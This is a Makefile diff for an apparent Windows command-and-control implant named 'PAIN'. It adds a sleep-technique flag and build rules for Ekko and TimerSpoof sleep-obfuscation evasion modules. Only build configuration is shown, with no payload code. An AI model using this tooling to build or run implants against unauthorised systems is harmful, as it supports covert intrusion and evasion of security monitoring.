@@ -13,8 +13,9 @@ PAIN_C2_PORT ?= 8080
 PAIN_SLEEP   ?= 5
 PAIN_JITTER  ?= 0
 PAIN_C2_SSL  ?= 0
-PAIN_AUTH_MODE ?= 0
-PAIN_AUTH_KEY  ?= 00000000000000000000000000000000
+PAIN_AUTH_MODE   ?= 0
+PAIN_AUTH_KEY    ?= 00000000000000000000000000000000
+PAIN_SLEEP_TECH  ?= 0
 # UUID is now generated at agent runtime - no compile-time value needed
 
 # Complier Flags - Cross-compile for windows
@@ -34,7 +35,8 @@ CXXFLAGS = -target x86_64-w64-mingw32 \
 		   -DPAIN_JITTER=$(PAIN_JITTER) \
 		   -DPAIN_C2_SSL=$(PAIN_C2_SSL) \
 		   -DPAIN_AUTH_MODE=$(PAIN_AUTH_MODE) \
-		   -DPAIN_AUTH_KEY=\"$(PAIN_AUTH_KEY)\"
+		   -DPAIN_AUTH_KEY=\"$(PAIN_AUTH_KEY)\" \
+		   -DPAIN_SLEEP_TECH=$(PAIN_SLEEP_TECH)
 
 
 # Output file as a PE COFF object file
@@ -60,7 +62,9 @@ CXX_OBJ = $(OBJ_DIR)/LdrLoad.o \
 		  $(OBJ_DIR)/Http.o      \
 		  $(OBJ_DIR)/Transport.o \
 		  $(OBJ_DIR)/Tasks.o      \
-		  $(OBJ_DIR)/Beacon.o     \
+		  $(OBJ_DIR)/Beacon.o      \
+		  $(OBJ_DIR)/TimerSpoof.o  \
+		  $(OBJ_DIR)/Ekko.o        \
 		  $(OBJ_DIR)/Bof.o        \
 		  $(OBJ_DIR)/BeaconApi.o  \
 
@@ -123,6 +127,14 @@ $(OBJ_DIR)/Tasks.o: Source/Misc/Tasks.cc
 	@$(CXX) $(CXXFLAGS) -c $< -o $@
 
 $(OBJ_DIR)/Beacon.o: Source/Evasion/Beacon.cc
+	@echo "[CXX] $<"
+	@$(CXX) $(CXXFLAGS) -c $< -o $@
+
+$(OBJ_DIR)/TimerSpoof.o: Source/Evasion/Sleep/TimerSpoof.cc
+	@echo "[CXX] $<"
+	@$(CXX) $(CXXFLAGS) -c $< -o $@
+
+$(OBJ_DIR)/Ekko.o: Source/Evasion/Sleep/Ekko.cc
 	@echo "[CXX] $<"
 	@$(CXX) $(CXXFLAGS) -c $< -o $@
 
